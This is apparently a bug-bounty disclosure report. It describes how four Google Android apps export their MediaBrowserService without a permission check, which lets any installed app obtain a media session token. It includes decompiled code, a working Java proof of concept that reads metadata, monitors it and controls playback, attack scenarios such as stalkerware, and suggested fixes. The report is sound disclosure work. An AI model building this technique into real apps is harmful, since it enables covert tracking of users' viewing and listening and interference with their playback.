# VRP Report #39: Systemic MediaBrowserService Privacy Leak Across 4 Google Apps

## Summary
Four Google apps — YouTube, YouTube Music, Google Play Books, and NotebookLM — export their `MediaBrowserService` without any permission restriction. Any installed app can connect via the standard `MediaBrowser` API and obtain the `MediaSession` token. This allows reading the user's currently playing video/song metadata (title, artist, album, thumbnail) — leaking their viewing/listening activity — and controlling playback (play, pause, stop, skip) without user consent or any permissions.

## Affected Components

| App | Component | Exported | Permission |
|-----|-----------|----------|------------|
| YouTube | `com.google.android.apps.youtube.app.extensions.mediabrowser.impl.MainAppMediaBrowserService` | true | NONE |
| YouTube Music | `com.google.android.apps.youtube.music.mediabrowser.MusicBrowserService` (extends `prc`→`gxv`) | true | NONE |
| Google Play Books | `com.google.android.apps.play.books.audio.BooksMediaBrowseService` | true | NONE |
| NotebookLM (Tailwind) | `com.ryanheise.audioservice.AudioService` | true | NONE |

## Vulnerability Details

### YouTube — MainAppMediaBrowserService

`onGetRoot()` (equivalent method in decompiled code):
```java
// Only SystemUI is blocked — ALL other callers get a root connection
public final cun b(String str) {
    if (str.equals("com.android.systemui")) {
        return null;          // ONLY SystemUI is blocked
    }
    return new cun(null);    // ALL other callers accepted
}
```

### YouTube Music — MusicBrowserService

`f()` method (line 232, partially decompiled due to complexity):
- Calls `pqx.h(callerPackage)` to check if caller is "browsable"
- Even when `h()` returns false, returns `new gws("__EMPTY_ROOT_ID__", null)` — not null
- A non-null BrowserRoot means **the connection is accepted** and the caller receives the `MediaSession.Token`
- The MediaSession token grants access to metadata AND transport controls regardless of the root ID

### Key Technical Point
The `MediaSession.Token` is exposed when `onGetRoot()` returns ANY non-null `BrowserRoot`. Even if `onLoadChildren()` returns empty results for `__EMPTY_ROOT_ID__`, the session token is already available to the caller through `MediaBrowser.getSessionToken()`. With the token, the caller constructs a `MediaController` that has full read access to metadata and full control over playback.

## Proof of Concept

```java
// YouTubeMediaSpyActivity.java — works for both YouTube and YouTube Music
// ZERO permissions required

// For YouTube:
MediaBrowser ytBrowser = new MediaBrowser(this,
    new ComponentName("com.google.android.youtube",
        "com.google.android.apps.youtube.app.extensions.mediabrowser.impl.MainAppMediaBrowserService"),
    connectionCallback, null);
ytBrowser.connect();

// For YouTube Music:
MediaBrowser ytmBrowser = new MediaBrowser(this,
    new ComponentName("com.google.android.apps.youtube.music",
        "com.google.android.apps.youtube.music.mediabrowser.MusicBrowserService"),  
    connectionCallback, null);
ytmBrowser.connect();

// In connectionCallback.onConnected():
MediaSession.Token token = browser.getSessionToken();
MediaController controller = new MediaController(context, token);

// READ: Current video/song metadata
MediaMetadata metadata = controller.getMetadata();
String title = metadata.getString(MediaMetadata.METADATA_KEY_TITLE);
String artist = metadata.getString(MediaMetadata.METADATA_KEY_ARTIST);
long duration = metadata.getLong(MediaMetadata.METADATA_KEY_DURATION);

// MONITOR: Real-time changes
controller.registerCallback(new MediaController.Callback() {
    @Override
    public void onMetadataChanged(MediaMetadata md) {
        // Triggered every time user changes video/song
    }
});

// CONTROL: Unauthorized playback manipulation
controller.getTransportControls().pause();
controller.getTransportControls().skipToNext();
```

## Impact

### Confidentiality (HIGH)
- **YouTube**: Any app can silently monitor what videos the user watches in real-time — titles, channels, durations
- **YouTube Music**: Any app can monitor the user's music listening history — songs, artists, albums
- Continuous real-time monitoring via `MediaController.Callback` tracks every content change
- Combined, reveals comprehensive entertainment consumption patterns

### Integrity (MEDIUM)  
- Any app can pause, play, stop, skip, or seek in both YouTube and YouTube Music playback
- Can disrupt user experience or be used as part of social engineering attacks

### Attack Scenarios
1. **Stalkerware**: Covert monitoring of all YouTube/Music activity — what they watch, what they listen to, when
2. **Behavioral profiling**: Building psychological profiles from entertainment preferences
3. **Targeted advertising**: Competitor apps monitoring viewing/listening patterns
4. **Harassment**: Repeatedly pausing playback or skipping to different content

### Severity
- **User Interaction**: NONE (zero-click, fully automated)
- **Permissions Required**: NONE
- **Attack Complexity**: LOW (standard Android MediaBrowser API)

## Fix Recommendation

### Option 1: Validate caller in onGetRoot()
```java
@Override
public BrowserRoot onGetRoot(String clientPackageName, int clientUid, Bundle rootHints) {
    // Allow only Google-signed apps and Android Auto
    if (!isGoogleSigned(clientPackageName) && !isAndroidAutoSigned(clientPackageName)) {
        return null;  // Reject non-Google callers entirely
    }
    return new BrowserRoot("root", null);
}
```

### Option 2: Return null for untrusted callers
Currently YouTube Music returns `BrowserRoot("__EMPTY_ROOT_ID__")` for unrecognized callers. This should be `null` to prevent connection and token exposure.

### Option 3: Add permission restriction
```xml
<service android:exported="true"
    android:permission="com.google.android.youtube.permission.MEDIA_BROWSE"
    ...>
```

## Device / Build
- Pixel 6a, Android 17 (API 37), Build CP2A.260605.012
- YouTube and YouTube Music as bundled
